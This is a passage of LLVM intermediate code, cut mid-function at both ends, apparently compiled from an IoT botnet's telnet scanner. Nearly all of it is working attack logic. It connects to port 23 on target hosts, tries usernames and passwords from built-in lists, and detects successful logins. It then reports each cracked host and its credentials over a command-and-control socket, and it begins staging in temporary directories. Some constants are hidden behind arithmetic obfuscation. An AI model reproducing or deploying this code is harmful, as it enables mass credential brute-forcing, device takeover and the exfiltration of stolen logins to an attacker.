  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %184, align 4
  %185 = call zeroext i16 @htons(i16 zeroext 23) #10
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %185, i16* %186, align 2
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %188 = getelementptr inbounds [8 x i8], [8 x i8]* %187, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %188, i8 0, i64 8, i32 4, i1 false)
  %189 = load i32, i32* %6, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %195 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %194, i32 0, i32 0
  store i32 %193, i32* %195, align 4
  %196 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %197 = load i32, i32* %6, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 0
  store i32 %196, i32* %200, align 16
  %201 = load i32, i32* %6, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = icmp eq i32 %205, -1
  br i1 %206, label %207, label %208

; <label>:207:                                    ; preds = %183
  br label %885

; <label>:208:                                    ; preds = %183
  %209 = load i32, i32* %6, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = load i32, i32* %6, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = call i32 (i32, i32, ...) @fcntl(i32 %218, i32 3, i8* null)
  %220 = xor i32 %219, -1
  %221 = xor i32 2048, -1
  %222 = xor i32 831379637, -1
  %223 = and i32 %220, 831379637
  %224 = and i32 %219, %222
  %225 = and i32 %221, 831379637
  %226 = and i32 2048, %222
  %227 = or i32 %223, %224
  %228 = or i32 %225, %226
  %229 = xor i32 %227, %228
  %230 = or i32 %220, %221
  %231 = xor i32 %230, -1
  %232 = or i32 831379637, %222
  %233 = and i32 %231, %232
  %234 = or i32 %229, %233
  %235 = or i32 %219, 2048
  %236 = call i32 (i32, i32, ...) @fcntl(i32 %213, i32 4, i32 %234)
  %237 = load i32, i32* %6, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 0
  %241 = load i32, i32* %240, align 16
  %242 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %243 = call i32 @connect(i32 %241, %struct.sockaddr* %242, i32 16)
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %253

; <label>:245:                                    ; preds = %208
  %246 = call i32* @__errno_location() #10
  %247 = load i32, i32* %246, align 4
  %248 = icmp ne i32 %247, 115
  br i1 %248, label %249, label %253

; <label>:249:                                    ; preds = %245
  %250 = load i32, i32* %6, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %251
  call void @reset_telstate(%struct.telstate_t* %252)
  br label %257

; <label>:253:                                    ; preds = %245, %208
  %254 = load i32, i32* %6, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %255
  call void @advance_telstate(%struct.telstate_t* %256, i32 1)
  br label %257

; <label>:257:                                    ; preds = %253, %249
  br label %884

; <label>:258:                                    ; preds = %94
  br label %259

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %261 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 0
  %262 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %261) #5, !srcloc !5
  %263 = extractvalue { i64, i64* } %262, 0
  %264 = extractvalue { i64, i64* } %262, 1
  %265 = trunc i64 %263 to i32
  store i32 %265, i32* %21, align 4
  %266 = ptrtoint i64* %264 to i64
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %22, align 4
  br label %268

; <label>:268:                                    ; preds = %259
  br label %269

; <label>:269:                                    ; preds = %268
  %270 = load i32, i32* %6, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = srem i32 %274, 64
  %276 = zext i32 %275 to i64
  %277 = shl i64 1, %276
  %278 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %279 = load i32, i32* %6, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = sdiv i32 %283, 64
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 %285
  %287 = load i64, i64* %286, align 8
  %288 = and i64 %287, %277
  %289 = xor i64 %287, %277
  %290 = or i64 %288, %289
  %291 = or i64 %287, %277
  store i64 %290, i64* %286, align 8
  %292 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %292, align 8
  %293 = load i32, i32* %3, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %294, i64* %295, align 8
  %296 = load i32, i32* %6, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = sub i32 0, 1
  %302 = sub i32 %300, %301
  %303 = add nsw i32 %300, 1
  %304 = call i32 @select(i32 %302, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %304, i32* %7, align 4
  %305 = load i32, i32* %7, align 4
  %306 = icmp eq i32 %305, 1
  br i1 %306, label %307, label %348

; <label>:307:                                    ; preds = %269
  %308 = call i64 @time(i64* null) #5
  %309 = trunc i64 %308 to i32
  %310 = load i32, i32* %6, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %311
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %312, i32 0, i32 7
  store i32 %309, i32* %313, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %314 = load i32, i32* %6, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 16
  %319 = bitcast i32* %15 to i8*
  %320 = call i32 @getsockopt(i32 %318, i32 1, i32 4, i8* %319, i32* %14) #5
  %321 = load i32, i32* %15, align 4
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %327

; <label>:323:                                    ; preds = %307
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %325
  call void @reset_telstate(%struct.telstate_t* %326)
  br label %347

; <label>:327:                                    ; preds = %307
  %328 = load i32, i32* %6, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 0
  %332 = load i32, i32* %331, align 16
  %333 = load i32, i32* %6, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 0
  %337 = load i32, i32* %336, align 16
  %338 = call i32 (i32, i32, ...) @fcntl(i32 %337, i32 3, i8* null)
  %339 = xor i32 -2049, -1
  %340 = xor i32 %338, %339
  %341 = and i32 %340, %338
  %342 = and i32 %338, -2049
  %343 = call i32 (i32, i32, ...) @fcntl(i32 %332, i32 4, i32 %341)
  %344 = load i32, i32* %6, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %345
  call void @advance_telstate(%struct.telstate_t* %346, i32 2)
  br label %347

; <label>:347:                                    ; preds = %327, %323
  br label %885

; <label>:348:                                    ; preds = %269
  %349 = load i32, i32* %7, align 4
  %350 = icmp eq i32 %349, -1
  br i1 %350, label %351, label %355

; <label>:351:                                    ; preds = %348
  %352 = load i32, i32* %6, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %353
  call void @reset_telstate(%struct.telstate_t* %354)
  br label %885

; <label>:355:                                    ; preds = %348
  br label %356

; <label>:356:                                    ; preds = %355
  %357 = load i32, i32* %6, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 7
  %361 = load i32, i32* %360, align 16
  %362 = sub i32 0, %361
  %363 = sub i32 0, 7
  %364 = add i32 %362, %363
  %365 = sub i32 0, %364
  %366 = add i32 %361, 7
  %367 = zext i32 %365 to i64
  %368 = call i64 @time(i64* null) #5
  %369 = icmp slt i64 %367, %368
  br i1 %369, label %370, label %374

; <label>:370:                                    ; preds = %356
  %371 = load i32, i32* %6, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %372
  call void @reset_telstate(%struct.telstate_t* %373)
  br label %374

; <label>:374:                                    ; preds = %370, %356
  br label %884

; <label>:375:                                    ; preds = %94
  %376 = load i32, i32* %6, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = load i32, i32* %3, align 4
  %382 = load i32, i32* %6, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 9
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @read_until_response(i32 %380, i32 %381, i8* %386, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %388 = icmp ne i32 %387, 0
  br i1 %388, label %389, label %412

; <label>:389:                                    ; preds = %375
  %390 = call i64 @time(i64* null) #5
  %391 = trunc i64 %390 to i32
  %392 = load i32, i32* %6, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 7
  store i32 %391, i32* %395, align 16
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 9
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @contains_fail(i8* %400)
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %389
  %404 = load i32, i32* %6, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %405
  call void @advance_telstate(%struct.telstate_t* %406, i32 0)
  br label %411

; <label>:407:                                    ; preds = %389
  %408 = load i32, i32* %6, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %409
  call void @advance_telstate(%struct.telstate_t* %410, i32 3)
  br label %411

; <label>:411:                                    ; preds = %407, %403
  br label %885

; <label>:412:                                    ; preds = %375
  %413 = load i32, i32* %6, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 7
  %417 = load i32, i32* %416, align 16
  %418 = sub i32 %417, 1374582348
  %419 = add i32 %418, 7
  %420 = add i32 %419, 1374582348
  %421 = add i32 %417, 7
  %422 = zext i32 %420 to i64
  %423 = call i64 @time(i64* null) #5
  %424 = icmp slt i64 %422, %423
  br i1 %424, label %425, label %429

; <label>:425:                                    ; preds = %412
  %426 = load i32, i32* %6, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %427
  call void @reset_telstate(%struct.telstate_t* %428)
  br label %429

; <label>:429:                                    ; preds = %425, %412
  br label %884

; <label>:430:                                    ; preds = %94
  %431 = load i32, i32* %6, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %433, i32 0, i32 0
  %435 = load i32, i32* %434, align 16
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 4
  %440 = load i8, i8* %439, align 2
  %441 = zext i8 %440 to i64
  %442 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %441
  %443 = load i8*, i8** %442, align 8
  %444 = load i32, i32* %6, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 4
  %448 = load i8, i8* %447, align 2
  %449 = zext i8 %448 to i64
  %450 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %449
  %451 = load i8*, i8** %450, align 8
  %452 = call i64 @strlen(i8* %451) #9
  %453 = call i64 @send(i32 %435, i8* %443, i64 %452, i32 16384)
  %454 = icmp slt i64 %453, 0
  br i1 %454, label %455, label %459

; <label>:455:                                    ; preds = %430
  %456 = load i32, i32* %6, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %457
  call void @reset_telstate(%struct.telstate_t* %458)
  br label %885

; <label>:459:                                    ; preds = %430
  %460 = load i32, i32* %6, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 0
  %464 = load i32, i32* %463, align 16
  %465 = call i64 @send(i32 %464, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %466 = icmp slt i64 %465, 0
  br i1 %466, label %467, label %471

; <label>:467:                                    ; preds = %459
  %468 = load i32, i32* %6, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %469
  call void @reset_telstate(%struct.telstate_t* %470)
  br label %885

; <label>:471:                                    ; preds = %459
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %473
  call void @advance_telstate(%struct.telstate_t* %474, i32 4)
  br label %884

; <label>:475:                                    ; preds = %94
  %476 = load i32, i32* %6, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 16
  %481 = load i32, i32* %3, align 4
  %482 = load i32, i32* %6, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 9
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @read_until_response(i32 %480, i32 %481, i8* %486, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %488 = icmp ne i32 %487, 0
  br i1 %488, label %489, label %512

; <label>:489:                                    ; preds = %475
  %490 = call i64 @time(i64* null) #5
  %491 = trunc i64 %490 to i32
  %492 = load i32, i32* %6, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 7
  store i32 %491, i32* %495, align 16
  %496 = load i32, i32* %6, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 9
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @contains_fail(i8* %500)
  %502 = icmp ne i32 %501, 0
  br i1 %502, label %503, label %507

; <label>:503:                                    ; preds = %489
  %504 = load i32, i32* %6, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %505
  call void @advance_telstate(%struct.telstate_t* %506, i32 0)
  br label %511

; <label>:507:                                    ; preds = %489
  %508 = load i32, i32* %6, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %509
  call void @advance_telstate(%struct.telstate_t* %510, i32 5)
  br label %511

; <label>:511:                                    ; preds = %507, %503
  br label %885

; <label>:512:                                    ; preds = %475
  %513 = load i32, i32* %6, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 7
  %517 = load i32, i32* %516, align 16
  %518 = sub i32 0, 7
  %519 = sub i32 %517, %518
  %520 = add i32 %517, 7
  %521 = zext i32 %519 to i64
  %522 = call i64 @time(i64* null) #5
  %523 = icmp slt i64 %521, %522
  br i1 %523, label %524, label %528

; <label>:524:                                    ; preds = %512
  %525 = load i32, i32* %6, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %526
  call void @reset_telstate(%struct.telstate_t* %527)
  br label %528

; <label>:528:                                    ; preds = %524, %512
  br label %884

; <label>:529:                                    ; preds = %94
  %530 = load i32, i32* %6, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 16
  %535 = load i32, i32* %6, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 5
  %539 = load i8, i8* %538, align 1
  %540 = zext i8 %539 to i64
  %541 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %540
  %542 = load i8*, i8** %541, align 8
  %543 = load i32, i32* %6, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 5
  %547 = load i8, i8* %546, align 1
  %548 = zext i8 %547 to i64
  %549 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %548
  %550 = load i8*, i8** %549, align 8
  %551 = call i64 @strlen(i8* %550) #9
  %552 = call i64 @send(i32 %534, i8* %542, i64 %551, i32 16384)
  %553 = icmp slt i64 %552, 0
  br i1 %553, label %554, label %558

; <label>:554:                                    ; preds = %529
  %555 = load i32, i32* %6, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %556
  call void @reset_telstate(%struct.telstate_t* %557)
  br label %885

; <label>:558:                                    ; preds = %529
  %559 = load i32, i32* %6, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = call i64 @send(i32 %563, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %565 = icmp slt i64 %564, 0
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %558
  %567 = load i32, i32* %6, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %568
  call void @reset_telstate(%struct.telstate_t* %569)
  br label %885

; <label>:570:                                    ; preds = %558
  %571 = load i32, i32* %6, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %572
  call void @advance_telstate(%struct.telstate_t* %573, i32 6)
  br label %884

; <label>:574:                                    ; preds = %94
  %575 = load i32, i32* %6, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 0
  %579 = load i32, i32* %578, align 16
  %580 = load i32, i32* %3, align 4
  %581 = load i32, i32* %6, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 9
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @read_until_response(i32 %579, i32 %580, i8* %585, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %587 = icmp ne i32 %586, 0
  br i1 %587, label %588, label %659

; <label>:588:                                    ; preds = %574
  %589 = call i64 @time(i64* null) #5
  %590 = trunc i64 %589 to i32
  %591 = load i32, i32* %6, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 7
  store i32 %590, i32* %594, align 16
  %595 = load i32, i32* %6, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 9
  %599 = load i8*, i8** %598, align 8
  %600 = call i32 @contains_fail(i8* %599)
  %601 = icmp ne i32 %600, 0
  br i1 %601, label %602, label %606

; <label>:602:                                    ; preds = %588
  %603 = load i32, i32* %6, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %604
  call void @advance_telstate(%struct.telstate_t* %605, i32 0)
  br label %658

; <label>:606:                                    ; preds = %588
  %607 = load i32, i32* %6, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 9
  %611 = load i8*, i8** %610, align 8
  %612 = call i32 @contains_success(i8* %611)
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %653

; <label>:614:                                    ; preds = %606
  %615 = load i32, i32* %6, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 3
  %619 = load i8, i8* %618, align 1
  %620 = zext i8 %619 to i32
  %621 = icmp eq i32 %620, 2
  br i1 %621, label %622, label %626

; <label>:622:                                    ; preds = %614
  %623 = load i32, i32* %6, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %624
  call void @advance_telstate(%struct.telstate_t* %625, i32 7)
  br label %652

; <label>:626:                                    ; preds = %614
  %627 = load i32, i32* @mainCommSock, align 4
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %629
  %631 = call i8* @get_telstate_host(%struct.telstate_t* %630)
  %632 = load i32, i32* %6, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 4
  %636 = load i8, i8* %635, align 2
  %637 = zext i8 %636 to i64
  %638 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %637
  %639 = load i8*, i8** %638, align 8
  %640 = load i32, i32* %6, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 5
  %644 = load i8, i8* %643, align 1
  %645 = zext i8 %644 to i64
  %646 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %645
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 (i32, i8*, ...) @sockprintf(i32 %627, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0), i8* %631, i8* %639, i8* %647)
  %649 = load i32, i32* %6, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %650
  call void @advance_telstate(%struct.telstate_t* %651, i32 7)
  br label %652

; <label>:652:                                    ; preds = %626, %622
  br label %657

; <label>:653:                                    ; preds = %606
  %654 = load i32, i32* %6, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %655
  call void @reset_telstate(%struct.telstate_t* %656)
  br label %657

; <label>:657:                                    ; preds = %653, %652
  br label %658

; <label>:658:                                    ; preds = %657, %602
  br label %885

; <label>:659:                                    ; preds = %574
  %660 = load i32, i32* %6, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 7
  %664 = load i32, i32* %663, align 16
  %665 = sub i32 0, 7
  %666 = sub i32 %664, %665
  %667 = add i32 %664, 7
  %668 = zext i32 %666 to i64
  %669 = call i64 @time(i64* null) #5
  %670 = icmp slt i64 %668, %669
  br i1 %670, label %671, label %675

; <label>:671:                                    ; preds = %659
  %672 = load i32, i32* %6, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %673
  call void @reset_telstate(%struct.telstate_t* %674)
  br label %675

; <label>:675:                                    ; preds = %671, %659
  br label %884

; <label>:676:                                    ; preds = %94
  %677 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %678 = call i32 (i8*, i8*, ...) @sprintf(i8* %677, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.117, i32 0, i32 0), i8** getelementptr inbounds ([10 x i8*], [10 x i8*]* @tempdirs, i32 0, i32 0)) #5
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 0
  %683 = load i32, i32* %682, align 16
  %684 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %685 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
